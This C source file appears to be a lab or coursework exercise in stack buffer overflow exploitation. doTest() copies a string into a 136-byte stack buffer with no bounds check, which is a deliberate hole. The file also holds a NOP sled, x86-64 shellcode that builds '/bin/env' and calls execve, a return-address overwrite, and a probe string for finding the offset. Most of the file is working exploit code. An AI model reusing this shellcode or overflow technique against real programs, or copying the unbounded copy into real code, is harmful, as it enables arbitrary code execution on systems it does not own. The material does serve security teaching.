#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");
    /* call the vulnerable function */
    doTest();

    exit(0);
}

// VAriable to contain hex bytes of shell code
char compromise[159] = {

    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    

    0x48, 0x31, 0xC0, 
    0x48, 0x31, 0xD2, 
    0x52,
    0x48, 0xB8, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x65, 0x6E,
    0x76,
    0x48, 0x89, 0xE7,
    0x57,
    0x48,0x31,0xD2,
    0x52,
    0x48, 0x89, 0xE6,
    0x48, 0x31, 0xC0,
    0x66, 0xB8, 0xFF, 0x7F,
    0x48, 0xC1, 0xE2, 0x20,
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,
    0x30, 0xC9,
    0x48, 0x09, 0xCA,
    0x48, 0x8B, 0x02,
    0x48, 0x31, 0xC0,  
    0xB8, 0x3B, 0x00, 0x00, 0x00,
    0x0F, 0x05,  
    0xB0, 0x3C, 
    0x31, 0xFF,   
    0x0F, 0x05,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xf7 //return address
};

// string variable to probe the stack and find the correct
// values for the shell code.


char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"
    "MNOPWXYZ"
    "xxxxxxxx"
    ;

int i;

void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise1[i]; i++){
	buffer[i] = compromise1[i];
    }
}

